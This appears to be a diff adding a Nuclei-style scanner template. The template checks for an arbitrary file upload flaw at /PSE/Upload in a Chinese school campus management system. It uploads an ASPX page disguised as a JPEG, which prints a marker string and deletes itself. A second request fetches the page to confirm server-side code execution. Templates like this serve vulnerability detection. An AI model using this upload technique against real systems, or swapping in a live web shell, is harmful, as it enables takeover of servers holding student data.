@@ -1,0 +1,40 @@
+id: zhongxiaoxuezhihui-PSE_Upload-File-upload
+
+info:
+  name: 中小学智慧校园信息管理系统 /PSE/Upload 文件上传
+  author: HuanXiong
+  severity: critical
+  tags: File Upload
+
+http:
+  - raw:
+      - |
+        POST /PSE/Upload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=00content0boundary00
+
+        --00content0boundary00
+        Content-Disposition: form-data; name="file"; filename="test.aspx"
+        Content-Type: image/jpg
+
+        <%@Page Language="C#"%><%Response.Write("pboyjnnrfipmplsukdeczudsefxmywe");System.IO.File.Delete(Request.PhysicalPath);%>
+        --00content0boundary00--
+      
+      - |
+        GET /Upload/PrimarySchoolEnrollment/{{uploadfile}} HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+       - type: regex 
+         part: body
+         name: uploadfile
+         group: 1
+         regex:
+            - '(\w+\d.+?\.aspx)'
+         internal: true
+
+    matchers:
+      - type: dsl
+        name: 任意文件上传
+        dsl:
+          - "status_code==200 && contains_all(body,'pboyjnnrfipmplsukdeczudsefxmywe')"
